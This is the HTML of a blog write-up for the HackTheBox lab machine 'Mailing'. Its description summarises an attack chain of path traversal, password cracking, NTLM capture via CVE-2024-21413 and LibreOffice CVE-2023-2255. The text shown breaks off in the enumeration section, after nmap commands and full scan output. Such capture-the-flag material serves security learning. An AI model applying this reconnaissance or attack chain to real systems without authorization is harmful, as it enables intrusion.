        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
    <h1 class="post-title entry-hint-parent">
      Mailing Writeup - HackTheBox
    </h1>
    <div class="post-description">
      Mailing is an easy Windows machine using path traversal to access hMailServer configs and crack the admin email password. Access to user maya is gained via CVE-2024-21413 to capture and crack NTLM, with root obtained by exploiting LibreOffice CVE-2023-2255.
    </div>
    <div class="post-meta"><span title='2024-09-12 00:00:00 +0000 UTC'>September 12, 2024</span>&nbsp;¬∑&nbsp;10 min&nbsp;¬∑&nbsp;1923 words&nbsp;¬∑&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/writeups/HackTheBox/Mailing/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> 
<figure class="entry-cover">
            <img loading="eager" src="http://localhost:1313/writeups/hackthebox/mailing/feature.png" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#enumeration">Enumeration</a></li>
    <li><a href="#user-root">User Root</a></li>
    <li><a href="#root-flag">Root Flag</a>
      <ul>
        <li><a href="#conclusion">Conclusion:</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><table>
  <thead>
      <tr>
          <th>Link:</th>
          <th><a href="https://app.hackthebox.com/machines/Mailing">https://app.hackthebox.com/machines/Mailing</a></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Difficulty</td>
          <td>Easy</td>
      </tr>
      <tr>
          <td>Machine</td>
          <td>Windows</td>
      </tr>
  </tbody>
</table>
<hr>
<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
<p><strong>Nmap</strong></p>
<p>I ran Nmap with the command <strong><code>nmap 10.10.11.14 -vv -p- -T4</code></strong>. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">PORT</span>      <span class="nx">STATE</span> <span class="nx">SERVICE</span>      <span class="nx">REASON</span>
</span></span><span class="line"><span class="cl"><span class="mi">25</span><span class="o">/</span><span class="nx">tcp</span>    <span class="nx">open</span>  <span class="nx">smtp</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>    <span class="nx">open</span>  <span class="nx">http</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">110</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">pop3</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">msrpc</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>  <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">143</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">imap</span>         <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span> <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">465</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">smtps</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">587</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">submission</span>   <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">993</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">imaps</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">5040</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">wsman</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">7680</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">pando</span><span class="o">-</span><span class="nx">pub</span>    <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">47001</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">winrm</span>        <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">49664</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">49665</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">49666</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">49667</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span><span class="line"><span class="cl"><span class="mi">55959</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>      <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>During the aggressive scan, I used the command <strong><code>nmap 10.10.11.14 -vv -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,55959 -T4 -A</code></strong>. While Nmap was busy scanning, I focused my attention on examining the HTTP server. The detailed scan provided me with comprehensive information about the target machine&rsquo;s services and configurations.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PORT      STATE    SERVICE       REASON      VERSION
</span></span><span class="line"><span class="cl">25/tcp    open     smtp          syn-ack     hMailServer smtpd
</span></span><span class="line"><span class="cl">| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span class="line"><span class="cl">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span class="line"><span class="cl">80/tcp    open     http          syn-ack     Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span class="line"><span class="cl">|_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl">|_http-title: Mailing
</span></span><span class="line"><span class="cl">110/tcp   open     pop3          syn-ack     hMailServer pop3d
</span></span><span class="line"><span class="cl">|_pop3-capabilities: USER TOP UIDL
</span></span><span class="line"><span class="cl">135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">143/tcp   open     imap          syn-ack     hMailServer imapd
</span></span><span class="line"><span class="cl">|_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK
</span></span><span class="line"><span class="cl">445/tcp   open     microsoft-ds? syn-ack
</span></span><span class="line"><span class="cl">465/tcp   open     ssl/smtp      syn-ack     hMailServer smtpd
</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
</span></span><span class="line"><span class="cl">| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
</span></span><span class="line"><span class="cl">| Public Key type: rsa
</span></span><span class="line"><span class="cl">| Public Key bits: 2048
</span></span><span class="line"><span class="cl">| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl">| Not valid before: 2024-02-27T18:24:10
</span></span><span class="line"><span class="cl">| Not valid after:  2029-10-06T18:24:10
</span></span><span class="line"><span class="cl">| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
</span></span><span class="line"><span class="cl">| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
</span></span><span class="line"><span class="cl">| -----BEGIN CERTIFICATE-----
</span></span><span class="line"><span class="cl">| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
</span></span><span class="line"><span class="cl">| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
</span></span><span class="line"><span class="cl">| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
</span></span><span class="line"><span class="cl">| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
</span></span><span class="line"><span class="cl">| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
</span></span><span class="line"><span class="cl">| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
</span></span><span class="line"><span class="cl">| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
</span></span><span class="line"><span class="cl">| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
</span></span><span class="line"><span class="cl">| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
</span></span><span class="line"><span class="cl">| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
</span></span><span class="line"><span class="cl">| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
</span></span><span class="line"><span class="cl">| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
</span></span><span class="line"><span class="cl">| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
</span></span><span class="line"><span class="cl">| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
</span></span><span class="line"><span class="cl">| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
</span></span><span class="line"><span class="cl">| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
</span></span><span class="line"><span class="cl">| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
</span></span><span class="line"><span class="cl">| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
</span></span><span class="line"><span class="cl">| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
</span></span><span class="line"><span class="cl">| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
</span></span><span class="line"><span class="cl">|_-----END CERTIFICATE-----
</span></span><span class="line"><span class="cl">|_ssl-date: TLS randomness does not represent time
</span></span><span class="line"><span class="cl">| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span class="line"><span class="cl">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span class="line"><span class="cl">587/tcp   open     smtp          syn-ack     hMailServer smtpd
</span></span><span class="line"><span class="cl">|_ssl-date: TLS randomness does not represent time
</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
</span></span><span class="line"><span class="cl">| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
</span></span><span class="line"><span class="cl">| Public Key type: rsa
</span></span><span class="line"><span class="cl">| Public Key bits: 2048
</span></span><span class="line"><span class="cl">| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl">| Not valid before: 2024-02-27T18:24:10
</span></span><span class="line"><span class="cl">| Not valid after:  2029-10-06T18:24:10
</span></span><span class="line"><span class="cl">| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
</span></span><span class="line"><span class="cl">| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
</span></span><span class="line"><span class="cl">| -----BEGIN CERTIFICATE-----
</span></span><span class="line"><span class="cl">| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
</span></span><span class="line"><span class="cl">| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
</span></span><span class="line"><span class="cl">| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
</span></span><span class="line"><span class="cl">| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
</span></span><span class="line"><span class="cl">| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
</span></span><span class="line"><span class="cl">| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
</span></span><span class="line"><span class="cl">| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
</span></span><span class="line"><span class="cl">| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
</span></span><span class="line"><span class="cl">| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
</span></span><span class="line"><span class="cl">| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
</span></span><span class="line"><span class="cl">| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
</span></span><span class="line"><span class="cl">| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
</span></span><span class="line"><span class="cl">| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
</span></span><span class="line"><span class="cl">| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
</span></span><span class="line"><span class="cl">| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
</span></span><span class="line"><span class="cl">| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
</span></span><span class="line"><span class="cl">| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
</span></span><span class="line"><span class="cl">| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
</span></span><span class="line"><span class="cl">| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
</span></span><span class="line"><span class="cl">| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
</span></span><span class="line"><span class="cl">|_-----END CERTIFICATE-----
</span></span><span class="line"><span class="cl">| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
</span></span><span class="line"><span class="cl">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span class="line"><span class="cl">993/tcp   open     ssl/imap      syn-ack     hMailServer imapd
</span></span><span class="line"><span class="cl">|_ssl-date: TLS randomness does not represent time
</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
</span></span><span class="line"><span class="cl">| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
</span></span><span class="line"><span class="cl">| Public Key type: rsa
</span></span><span class="line"><span class="cl">| Public Key bits: 2048
</span></span><span class="line"><span class="cl">| Signature Algorithm: sha256WithRSAEncryption
</span></span><span class="line"><span class="cl">| Not valid before: 2024-02-27T18:24:10
</span></span><span class="line"><span class="cl">| Not valid after:  2029-10-06T18:24:10
</span></span><span class="line"><span class="cl">| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
</span></span><span class="line"><span class="cl">| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
</span></span><span class="line"><span class="cl">| -----BEGIN CERTIFICATE-----
</span></span><span class="line"><span class="cl">| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
</span></span><span class="line"><span class="cl">| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
</span></span><span class="line"><span class="cl">| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
</span></span><span class="line"><span class="cl">| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
</span></span><span class="line"><span class="cl">| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
</span></span><span class="line"><span class="cl">| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
</span></span><span class="line"><span class="cl">| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
</span></span><span class="line"><span class="cl">| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
</span></span><span class="line"><span class="cl">| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
</span></span><span class="line"><span class="cl">| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
</span></span><span class="line"><span class="cl">| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
</span></span><span class="line"><span class="cl">| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
</span></span><span class="line"><span class="cl">| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
</span></span><span class="line"><span class="cl">| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
</span></span><span class="line"><span class="cl">| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
</span></span><span class="line"><span class="cl">| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
</span></span><span class="line"><span class="cl">| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
</span></span><span class="line"><span class="cl">| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
</span></span><span class="line"><span class="cl">| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
</span></span><span class="line"><span class="cl">| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
</span></span><span class="line"><span class="cl">|_-----END CERTIFICATE-----
</span></span><span class="line"><span class="cl">|_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK
</span></span><span class="line"><span class="cl">5040/tcp  open     unknown       syn-ack
</span></span><span class="line"><span class="cl">5985/tcp  open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl">|_http-title: Not Found
</span></span><span class="line"><span class="cl">7680/tcp  open     pando-pub?    syn-ack
</span></span><span class="line"><span class="cl">47001/tcp open     http          syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl">|_http-title: Not Found
</span></span><span class="line"><span class="cl">49664/tcp open     msrpc         syn-ack     Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49665/tcp open     msrpc         syn-ack     Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49666/tcp open     msrpc         syn-ack     Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open     msrpc         syn-ack     Microsoft Windows RPC
</span></span><span class="line"><span class="cl">55959/tcp filtered unknown       no-response
</span></span><span class="line"><span class="cl">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl">| p2p-conficker: 
</span></span><span class="line"><span class="cl">|   Checking for Conficker.C or higher...
</span></span><span class="line"><span class="cl">|   Check 1 (port 29452/tcp): CLEAN (Timeout)
</span></span><span class="line"><span class="cl">|   Check 2 (port 39838/tcp): CLEAN (Timeout)
</span></span><span class="line"><span class="cl">|   Check 3 (port 37492/udp): CLEAN (Timeout)
</span></span><span class="line"><span class="cl">|   Check 4 (port 25477/udp): CLEAN (Timeout)
</span></span><span class="line"><span class="cl">|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span class="line"><span class="cl">| smb2-time: 
</span></span><span class="line"><span class="cl">|   date: 2024-05-05T11:59:54
